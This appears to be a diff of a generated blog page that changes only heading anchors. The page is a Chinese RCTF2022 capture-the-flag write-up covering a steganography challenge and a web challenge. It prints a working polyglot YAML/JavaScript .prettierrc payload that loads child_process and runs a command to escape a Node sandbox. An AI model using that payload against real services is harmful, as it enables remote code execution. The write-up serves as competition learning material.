@@ -153,7 +153,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">RCTF2022-Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">1.1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-alient"><span class="nav-number">1.1.1.</span> <span class="nav-text">ez_alient</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-2"><span class="nav-number">1.2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PrettierOnline"><span class="nav-number">1.2.1.</span> <span class="nav-text">PrettierOnline</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-upload"><span class="nav-number">1.2.2.</span> <span class="nav-text">easy_upload</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#rctf2022-writeup"><span class="nav-number">1.</span> <span class="nav-text"> RCTF2022-Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">1.1.</span> <span class="nav-text"> misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez_alient"><span class="nav-number">1.1.1.</span> <span class="nav-text"> ez_alient</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.2.</span> <span class="nav-text"> Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#prettieronline"><span class="nav-number">1.2.1.</span> <span class="nav-text"> PrettierOnline</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy_upload"><span class="nav-number">1.2.2.</span> <span class="nav-text"> easy_upload</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -303,10 +303,10 @@
     <div class="post-body" itemprop="articleBody">
         <p>部分为比赛中的解题过程，部分为赛后复现题解QAQ</p>
 <span id="more"></span>
-<h1>RCTF2022-Writeup</h1>
+<h1 id="rctf2022-writeup"><a class="markdownIt-Anchor" href="#rctf2022-writeup"></a> RCTF2022-Writeup</h1>
 <p>​                                                                                                                                                               ---------------TWe1v3</p>
-<h2 id="misc">misc</h2>
-<h3 id="ez-alient">ez_alient</h3>
+<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2>
+<h3 id="ez_alient"><a class="markdownIt-Anchor" href="#ez_alient"></a> ez_alient</h3>
 <p>使用zsteg扫描alien.tmp获得一串base64编码</p>
 <p><img src="/2022/12/RCTF2022-Writeup/image-20221210144522995.png" alt="01"></p>
 <p>解码得到：<code>pwd=&quot;N0bOdy_l0ves_Me&quot;</code></p>
@@ -371,8 +371,8 @@
 </table>
 <p>简单拼接可得flag：</p>
 <p>RCTF{Si13nc3_15_nEvEr_9ivin9_up_&amp;&amp;_6ut_h01din9_On_Si13nT1y}</p>
-<h2 id="Web-2">Web</h2>
-<h3 id="PrettierOnline">PrettierOnline</h3>
+<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
+<h3 id="prettieronline"><a class="markdownIt-Anchor" href="#prettieronline"></a> PrettierOnline</h3>
 <p>查看<code>.prettierrc</code>的配置文件说明<a target="_blank" rel="noopener" href="https://prettier.io/docs/en/configuration.html">Configuration File · Prettier</a></p>
 <p>A file written in JSON or YAML.<code>.prettierrc</code></p>
 <p>即<code>.prettierrc</code>支持JSON和YAML两种配置文件，即需要我构建配置文件能够被解析成JS文件和YAML文件。</p>
@@ -382,7 +382,7 @@
 <p>查阅 <a target="_blank" rel="noopener" href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/%E8%8E%B7%E5%BE%97%E6%9C%80%E5%90%8E%E7%9A%84payload">https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/获得最后的payload</a></p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">var</span> <span class="string">T=`:</span> <span class="comment">#`;module.exports = ()=&gt;&#123;return global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString()&#125;;/*</span></span><br><span class="line"><span class="attr">trailingComma:</span> <span class="string">es5</span></span><br><span class="line"><span class="attr">tabWidth:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">semi:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">singleQuote:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">parser:</span> <span class="string">.prettierrc</span></span><br><span class="line"><span class="comment"># */</span></span><br></pre></td></tr></table></figure>
 <p>RCTF{pReTtiErRc.yAmL.iS.fUnnY}</p>
-<h3 id="easy-upload">easy_upload</h3>
+<h3 id="easy_upload"><a class="markdownIt-Anchor" href="#easy_upload"></a> easy_upload</h3>
 
     </div>
 
